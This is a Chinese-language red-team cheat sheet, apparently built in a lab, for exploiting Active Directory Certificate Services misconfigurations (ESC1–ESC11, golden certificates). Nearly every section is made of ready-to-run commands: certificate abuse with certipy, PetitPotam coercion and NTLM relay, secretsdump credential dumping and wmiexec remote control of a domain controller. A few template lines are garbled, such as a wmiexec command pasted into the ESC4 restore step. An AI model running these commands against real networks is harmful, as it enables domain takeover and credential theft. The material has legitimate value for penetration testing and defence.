# ADCS Attack Surface - ADCS攻击面

## 信息收集

### 获取证书模板以及ADCS信息

```shell
# 模板
proxychains certipy find -u <域用户>@<域名> -p <密码> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy find -u worker@redteam.com -p worker@123 -dc-ip 10.10.10.1 -dns-tcp
```

![info](../../images/AD/ADCS/adcs-info-1.png)

### 获取ADCS服务器域名

```shell
# 模板
grep "DNS Name" <刚才收集的信息文件名>
# 示例
grep "DNS Name" 20230915154218_Certipy.txt
```

![info](../../images/AD/ADCS/adcs-info-2.png)

#### 获取CA证书颁发机构名称

```shell
# 模板
grep "DNS Name" <刚才收集的信息文件名>
# 示例
grep "CA Name" 20230915164357_Certipy.txt
```

![info](../../images/AD/ADCS/adcs-info-3.png)

## 权限提升

### Template misconfiguration - 模板配置错误

#### ESC1

##### 环境配置

- certsrv.msc打开证书颁发机构
- 右击证书模板 > 管理 > 右击现有的证书模板 > 复制模板
- 按照以下条件配置错误模板
- 右击证书模板 > 新建 > 要颁发的证书模板

##### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 模板定义了启用认证的EKU
- 证书模板允许请求者在CSR中指定一个SAN

![esc1](../../images/AD/ADCS/adcs-esc1-cnd-1.png)

![esc1](../../images/AD/ADCS/adcs-esc1-cnd-2.png)

![esc1](../../images/AD/ADCS/adcs-esc1-cnd-3.png)

##### 前期准备

- 获取证书模板漏洞信息

![esc1](../../images/AD/ADCS/adcs-esc1-info-1.png)

##### 攻击方法

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST1 -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![esc1](../../images/AD/ADCS/adcs-esc1-att-1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![esc1](../../images/AD/ADCS/adcs-esc1-att-2.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![esc1](../../images/AD/ADCS/adcs-esc1-att-3.png)

#### ESC2

##### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 证书模板中定义了No EKU或Any EKU

![esc2](../../images/AD/ADCS/adcs-esc2-cnd-1.png)

![esc2](../../images/AD/ADCS/adcs-esc2-cnd-2.png)

![esc2](../../images/AD/ADCS/adcs-esc2-cnd-3.png)

##### 前期准备

- 获取证书模板漏洞信息

![esc2](../../images/AD/ADCS/adcs-esc2-info-1.png)

##### 攻击方法

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST2 -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![esc2](../../images/AD/ADCS/adcs-esc2-att-1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![esc2](../../images/AD/ADCS/adcs-esc2-att-2.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![esc2](../../images/AD/ADCS/adcs-esc2-att-3.png)

#### ESC3

##### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 证书模板中定义了证书请求代理EKU(1.3.6.1.4.1.311.20.2.1)

![esc3](../../images/AD/ADCS/adcs-esc3-cnd-1.png)

![esc3](../../images/AD/ADCS/adcs-esc3-cnd-2.png)

![esc3](../../images/AD/ADCS/adcs-esc3-cnd-3.png)

##### 前期准备

- 获取证书模板漏洞信息

![esc3](../../images/AD/ADCS/adcs-esc3-info-1.png)

##### 攻击方法

- 申请当前用户证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST3 -dc-ip 10.10.10.1 -dns-tcp
```

![esc3](../../images/AD/ADCS/adcs-esc3-att-1.png)

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template User -on-behalf-of '<域名>\Administrator' -pfx worker.pfx -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template User -on-behalf-of 'redteam\administrator' -pfx worker.pfx -dc-ip 10.10.10.1 -dns-tcp
```

![esc3](../../images/AD/ADCS/adcs-esc3-att-2.png)

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![esc3](../../images/AD/ADCS/adcs-esc3-att-3.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![esc3](../../images/AD/ADCS/adcs-esc3-att-4.png)

### CA misconfiguration - 证书颁发机构错误配置

#### ESC6

##### 利用条件

- 启用EDITF_ATTRIBUTESUBJECTALTNAME2标志

###### 漏洞环境配置

- 使用以下命令配置漏洞环境，配位完毕后要重启服务（这里修改User模板的属性）

```shell
# 模板
certutil -config "<ADCS域名>\<证书模板>" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2
# 示例
certutil -config "adcs.redteam.com\User" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2
```

![esc6](../../images/AD/ADCS/adcs-esc5-cnd-1.png)

##### 前期准备

- 获取证书模板漏洞信息

![esc6](../../images/AD/ADCS/adcs-esc5-info-1.png)

##### 攻击方法

- 申请域管理员证书

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template User -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![esc6](../../images/AD/ADCS/adcs-esc5-att-1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![esc6](../../images/AD/ADCS/adcs-esc5-att-2.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![esc6](../../images/AD/ADCS/adcs-esc5-att-3.png)

##### 防御方法

- 删除收影响模板的属性

```shell
# 模板
certutil -config "<ADCS服务器域名>\<模板名称>" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
# 示例
certutil -config "adcs.redteam.com\User" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

![esc6](../../images/AD/ADCS/adcs-esc5-def-1.png)

### Extension misconfiguration - 扩展配置错误

#### ESC9 - 无安全扩展

##### 环境搭建

- 在ADCS直接复制User模板重命名为ESC9模板，并且去除要提供电子邮件名称的选项

![esc9](..\..\images\AD\ADCS\esc9\cnd\1.png)

- 为ESC9模板的msPKI-Enrollment-Flag属性添加CT_FLAG_NO_SECURITY_EXETENSION标志

```shell
# 模板
certutil -dstemplate "<漏洞模板名称>" msPKI-Enrollment-Flag +0x80000
# 示例
certutil -dstemplate "ESC9" msPKI-Enrollment-Flag +0x80000
```

![esc9](..\..\images\AD\ADCS\esc9\cnd\2.png)

- 在DC为useradmin用户添加对worker用户的GenericWrite权限

```shell
# 模板
dsacls "CN=<拥有ESC模板注册权限的用户>,CN=Users,DC=hacker,DC=com" /I:T /G <主控制用户>:GW
# 示例
dsacls "CN=worker,CN=Users,DC=hacker,DC=com" /I:T /G useradmin:GW
```

![esc9](..\..\images\AD\ADCS\esc9\cnd\3.png)

##### 利用条件

- 注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc的StrongCertificateBindingEnforcement未被设置为2（在KB5014754补丁之前该键不存在，但值为0）
- 证书模板msPKI-Enrollment-Flag存在标志CT_FLAG_NO_SECURITY_EXTENSION（值为0x80000）
- 模板允许EKU（客户端身份认证）
- 被控账户a对任意账户b有GenericWrite权限

##### 前期准备

- 使用certipy find获取ESC9漏洞模板信息

![esc9](..\..\images\AD\ADCS\esc9\pre\1.png)

##### 攻击方法

- 修改被GenericWrite的用户的upn

```shell
# 模板
proxychains certipy account update -u <当前用户> -p <密码> -user <被GenericWrite的用户> -upn administrator
# 示例
proxychains certipy account update -u useradmin@hacker.com -p useradmin@123 -user worker -upn administrator
```

![esc9](..\..\images\AD\ADCS\esc9\att\1.png)

- 获取被GenericWrite的用户的哈希

```shell
# 模板
proxychains certipy shadow auto -u <当前用户> -p <密码> -account <被GenericWrite的用户>
# 示例
proxychains certipy shadow auto -u useradmin@hacker.com -p useradmin@123 -account worker
```

![esc9](..\..\images\AD\ADCS\esc9\att\2.png)

- 申请域管理员证书

```shell
# 模板
proxychains certipy req -u <被GenericWrite的用户> -hashes <哈希> -ca <证书颁发机构> -template <漏洞模板名称> -target <ADCS服务器IP>
# 示例
proxychains certipy req -u worker@hacker.com -hashes bbe3917916fd5431dd37d287072bf52b -ca hacker-CASVR-CA -template ESC9 -target 10.10.80.1
```

![esc9](..\..\images\AD\ADCS\esc9\att\3.png)

- 将被GenericWrite的用户恢复到原来的upn

```shell
# 模板
proxychains certipy account update -u <当前用户> -p <密码> -user <被GenericWrite的用户> -upn <被GenericWrite的用户>
# 示例
proxychains certipy account update -u useradmin@hacker.com -p useradmin@123 -user worker -upn worker@hacker.com
```

![esc9](..\..\images\AD\ADCS\esc9\att\4.png)

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域控IP> -domain <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -domain hacker.com
```

![esc9](..\..\images\AD\ADCS\esc9\att\5.png)

#### ESC10 - 弱证书映射//todo

### Access Controls Attacks - ACL安全威胁

#### ESC4

##### 利用条件

![esc4](../../images/AD/ADCS/adcs-esc4-cnd-1.png)

![esc4](../../images/AD/ADCS/adcs-esc4-cnd-2.png)

![esc4](../../images/AD/ADCS/adcs-esc4-cnd-3.png)

##### 前期准备

- 获取证书模板漏洞信息

![esc4](../../images/AD/ADCS/adcs-esc4-info-1.png)

##### 攻击方法

- 使用ESC1模板覆盖ESC4模板并保存ESC4旧模板

```shell
# 模板
proxychains certipy template -username <域用户>@<域名> -password <密码> -template TEST4 -save-old -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy template -username worker@redteam.com -password worker@123 -template TEST4 -save-old -dc-ip 10.10.10.1 -dns-tcp
```

![esc4](../../images/AD/ADCS/adcs-esc4-att-1.png)

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST4 -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![esc4](../../images/AD/ADCS/adcs-esc4-att-2.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![esc4](../../images/AD/ADCS/adcs-esc4-att-3.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![esc4](../../images/AD/ADCS/adcs-esc4-att-4.png)

- 恢复ESC4模板

```shell
# 模板
proxychains certipy template -username <域用户>@<域名> -password <密码> -template ESC4-Test -configuration ESC4-Test.jsonpython3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains certipy template -username worker@redteam.com -password worker@123 -template TEST4 -configuration TEST4.json -dc-ip 10.10.10.1 -dns-tcp
```

![esc4](../../images/AD/ADCS/adcs-esc4-att-5.png)

#### ESC7

##### 用户拥有颁发和管理证书权限

###### 环境搭建

- 使用高权限账号为当前账号赋予"颁发和管理证书"权限

```shell
# 模板
proxychains certipy ca -ca <证书颁发机构名称> -add-officer <被授权用户名> -username <管理员>@<域名> -password <密码> -dc-ip <域控服务器IP> -target-ip <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -add-officer worker -username administrator@hacker.com -password dcadmin@123 -dc-ip 10.10.10.1 -target-ip 10.10.80.1
```

![esc7](..\..\images\AD\ADCS\esc7\officer\cnd\1.png)

- 这里基于ESC1创建了ESC7证书模板

![esc7](..\..\images\AD\ADCS\esc7\officer\cnd\2.png)

###### 利用条件

- 当前用户拥有"颁发和管理证书"权限
- 存在一个可申请的证书模板，且此模板的Enrollment Flag拥有PendAllRequests值
- 此模板存在其他模板漏洞（PS：在拥有"颁发和管理证书"权限下，单纯的ESC7模板无法攻击成功）

###### 前期准备

- 查找可申请的证书模板，并且需要审核才能颁发的证书（这里Certificate Name Flag存在EnrolleeSuppliesSubject值，说明存在ESC1模板漏洞）

```shell
proxychains certipy find -u worker@hacker.com -p worker@123 -dc-ip 10.10.10.1 -enable
```

![esc7](..\..\images\AD\ADCS\esc7\officer\pre\1.png)

###### 攻击方法

- 申请需要PendAllRequests的证书，保存key的id

```shell
# 模板
proxychains certipy req -username <用户名>@<域名> -password <密码> -ca <CA证书机构名称> -target <ADCS服务器名称> -template <需要PendAllRequests的证书模板> -upn <域管理员账号>  -dc-ip <域控服务器IP>
# 示例
proxychains certipy req -username worker@hacker.com -password worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template ESC7 -upn administrator@hacker.com -dc-ip 10.10.10.1
```

![esc7](..\..\images\AD\ADCS\esc7\officer\att\1.png)

- 根据key的id审核刚才申请的管理员证书

```shell
# 模板
proxychains certipy ca -ca '<CA证书机构名称>' -issue-request <key的id> -username <具备管理CA的用户> -password <密码> -dc-ip <域控服务器IP> -target-ip <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -issue-request 12 -username worker@hacker.com -password worker@123 -dc-ip 10.10.10.1 -target-ip 10.10.80.1
```

![esc7](..\..\images\AD\ADCS\esc7\officer\att\2.png)

- 根据刚才key的id申请域管理员证书

```shell
# 模板
proxychains certipy req -username <具备管理CA的用户> -password <密码> -ca <CA证书机构名称> -target-ip <ADCS服务器IP> -retrieve <key的id>
# 示例
proxychains certipy req -username worker@hacker.com -password worker@123 -ca hacker-CASVR-CA -target 10.10.80.1 -retrieve 12
```

![esc7](..\..\images\AD\ADCS\esc7\officer\att\3.png)

- 使用域管理员证书获取HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![esc7](..\..\images\AD\ADCS\esc7\officer\att\4.png)

##### 用户拥有管理CA权限

###### 环境搭建

- 使用高权限账号为当前账号赋予"管理CA"权限

```shell
# 模板
proxychains certipy ca -ca <证书颁发机构名称> -add-manager <被授权用户名> -username <管理员>@<域名> -password <密码> -dc-ip <域控服务器IP> -target-ip <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -add-manager worker -username administrator@hacker.com -password dcadmin@123 -dc-ip 10.10.10.1 -target-ip 10.10.80.1
```

![esc7](..\..\images\AD\ADCS\esc7\manager\cnd\1.png)

###### 利用条件

- 拥有"管理CA权限"的权限的用户

###### 前期准备

- 查看certipy find报告发现当前账号存在CA高危权限，即ESC7

![esc7](..\..\images\AD\ADCS\esc7\manager\pre\1.png)

###### 攻击方法

- 使用CA管理员为当前账号赋予"颁发和管理证书"权限

```shell
# 模板
proxychains certipy ca -ca <证书颁发机构名称> -add-officer <被授权用户名> -username <管理员>@<域名> -password <密码> -dc-ip <域控服务器IP> -target-ip <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -add-officer worker -username worker@hacker.com -password worker@123 -dc-ip 10.10.10.1 -target-ip 10.10.80.1
```

![esc7](..\..\images\AD\ADCS\esc7\manager\att\1.png)

- 启用SubCA证书模板

```shell
# 模板
proxychains certipy ca -ca <CA证书机构名称> -enable-template SubCA -username <CA管理员>@<域名> -password <密码> -dc-ip <域控服务器IP> -target-ip <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -enable-template SubCA -username worker@hacker.com -password worker@123 -dc-ip 10.10.10.1 -target-ip 10.10.80.1
```

![esc7](..\..\images\AD\ADCS\esc7\manager\att\2.png)

- 申请域管理员证书，保存key的id

```shell
# 模板
proxychains certipy req -username <用户名>@<域名> -password <密码> -ca <CA证书机构名称> -target <ADCS服务器名称> -template SubCA -upn <域管理员账号>  -dc-ip <域控服务器IP>
# 示例
proxychains certipy req -username worker@hacker.com -password worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template SubCA -upn administrator@hacker.com -dc-ip 10.10.10.1
```

![esc7](..\..\images\AD\ADCS\esc7\manager\att\3.png)

- 根据key的id审核刚才申请的管理员证书

```shell
# 模板
proxychains certipy ca -ca '<CA证书机构名称>' -issue-request <key的id> -username <具备管理CA的用户> -password <密码> -dc-ip <域控服务器IP> -target-ip <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -issue-request 8 -username worker@hacker.com -password worker@123 -dc-ip 10.10.10.1 -target-ip 10.10.80.1
```

![esc7](..\..\images\AD\ADCS\esc7\manager\att\4.png)

- 根据刚才key的id申请域管理员证书

```shell
# 模板
proxychains certipy req -username <具备管理CA的用户> -password <密码> -ca <CA证书机构名称> -target-ip <ADCS服务器IP> -retrieve <key的id>
# 示例
proxychains certipy req -username worker@hacker.com -password worker@123 -ca hacker-CASVR-CA -target 10.10.80.1 -retrieve 8
```

![esc7](..\..\images\AD\ADCS\esc7\manager\att\5.png)

- 使用域管理员证书获取HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![esc7](..\..\images\AD\ADCS\esc7\manager\att\6.png)

### Relay Attacks - 中继攻击

#### ESC8

##### 利用条件

- 获取当前被控服务器的管理员权限
- CA证书服务器是开启NTLM认证

##### 前期准备

###### 查看CA证书服务器是否开启NTLM认证

- 若返回结果为WWW-Authenticate: NTLM则开启NTLM认证

```shell
# 模板
proxychains curl <ADCS服务器IP>/certsrv/ -I
# 示例
proxychains curl 10.10.10.4/certsrv/ -I
```

![esc8](../../images/AD/ADCS/adcs-esc8-cnd-1.png)

##### 攻击方法

- 中继服务器开启监听

```shell
# 模板
proxychains certipy relay -target 'http://<ADCS服务器IP或域名>' -template <证书模板>
# 示例
proxychains certipy relay -target 'http://10.10.10.11' -template DomainController
```

![esc8](../../images/AD/ADCS/adcs-esc8-att-1.png)

- 使用强制认证漏洞（PS：这里使用PetitPotam）

```shell
# 模板
proxychains python3 PetitPotam.py -d <域名> -u <域用户> -p <密码> <中继服务器IP> <域控服务器IP>
# 示例
proxychains python3 PetitPotam.py -d redteam.com -u worker -p worker@123 10.10.255.1 10.10.10.10
```

![esc8](../../images/AD/ADCS/adcs-esc8-att-2.png)

- 成功获取域控证书

![esc8](../../images/AD/ADCS/adcs-esc8-att-3.png)

- 获取域控票据

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名> -dns-tcp
# 示例
proxychains certipy auth -pfx dc.pfx -dc-ip 10.10.10.10 -dns-tcp
```

![esc8](../../images/AD/ADCS/adcs-esc8-att-4.png)

- dump域管理员hash

```shell
# 模板
KRB5CCNAME=<TGT票据> python3 secretsdump.py -no-pass -k <域控服务器域名> -just-dc-user <域管理员账号> -just-dc-ntlm 
# 示例
KRB5CCNAME=dc.ccache proxychains python3 secretsdump.py -no-pass -k DC.sec.com -just-dc-user administrator -just-dc-ntlm
```

![esc8](../../images/AD/ADCS/adcs-esc8-att-5.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass sec.com/administrator@DC.sec.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![esc8](../../images/AD/ADCS/adcs-esc8-att-6.png)

#### ESC11

##### 利用条件

- 证书颁发机构未配置IF_ENFORCEENCRYPTICERTREQUEST

- 当HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA的InterfaceFlags的值为441时，即未配置IF_ENFORCEENCRYPTICERTREQUEST

![esc11](../../images/AD/ADCS/adcs-esc11-cnd-1.png)

##### 攻击方法

- 中继服务器开启监听

```shell
# 模板
proxychains certipy relay -target 'rpc://<证书服务器域名或IP>' -ca '<证书颁发机构名称>' -template DomainController
# 示例
proxychains certipy relay -target 'rpc://10.10.10.11' -ca 'CA' -template DomainController
```

![esc11](../../images/AD/ADCS/adcs-esc11-att-1.png)

- 使用强制认证漏洞（PS：这里使用PetitPotam）

```shell
# 模板
proxychains python3 PetitPotam.py -d <域名> -u <域用户> -p <密码> <中继服务器IP> <域控服务器IP>
# 示例
proxychains python3 PetitPotam.py -d redteam.com -u worker -p worker@123 10.10.255.1 10.10.10.10
```

![esc8](../../images/AD/ADCS/adcs-esc11-att-2.png)

- 成功获取域控证书

![esc8](../../images/AD/ADCS/adcs-esc11-att-3.png)

- 获取域控票据

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名> -dns-tcp
# 示例
proxychains certipy auth -pfx dc.pfx -dc-ip 10.10.10.10 -dns-tcp
```

![esc11](../../images/AD/ADCS/adcs-esc11-att-4.png)

- dump域管理员hash

```shell
# 模板
KRB5CCNAME=<TGT票据> python3 secretsdump.py -no-pass -k <域控服务器域名> -just-dc-user <域管理员账号> -just-dc-ntlm 
# 示例
KRB5CCNAME=dc.ccache proxychains python3 secretsdump.py -no-pass -k DC.sec.com -just-dc-user administrator -just-dc-ntlm
```

![esc11](../../images/AD/ADCS/adcs-esc11-att-5.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass sec.com/administrator@DC.sec.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![esc11](../../images/AD/ADCS/adcs-esc11-att-6.png)

### 漏洞

### Certifried - CVE-2022–26923

## 权限维持

### Golden Certificates - 黄金证书//todo

#### 利用条件

- 拥有域管理员密码或哈希或票据

#### 攻击方法

- 使用用域管理员账号保存CA证书和密钥

```shell
# 模板
proxychains certipy ca -backup -ca <CA名称>  -u <域管理员账号> -hashes <管理员HASH> -target-ip <证书颁发机构IP>
# 示例
proxychains certipy ca -backup -ca hacker-CASVR-CA -u administrator@hacker.com -hashes 7782c491c3a02792f0e86319b29e7a24 -target-ip 10.10.80.1
```

![golden-cert](../../images/AD/ADCS/golden-cert/att/1.png)

- 使用黄金证书为用户颁发证书

```shell
# 模板
proxychains certipy forge -ca-pfx <黄金证书> -upn <域账号> -subject <用户属性> -crl <CA服务器IP>
# 示例
proxychains certipy forge -ca-pfx hacker-CASVR-CA.pfx -upn administrator@hacker.com -subject 'CN=administrator,CN=users,DC=hacker,DC=com' -crl 10.10.80.1
```

![golden-cert](../../images/AD/ADCS/golden-cert/att/2.png)

- 使用用户证书获取哈希

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```

![golden-cert](../../images/AD/ADCS/golden-cert/att/3.png)
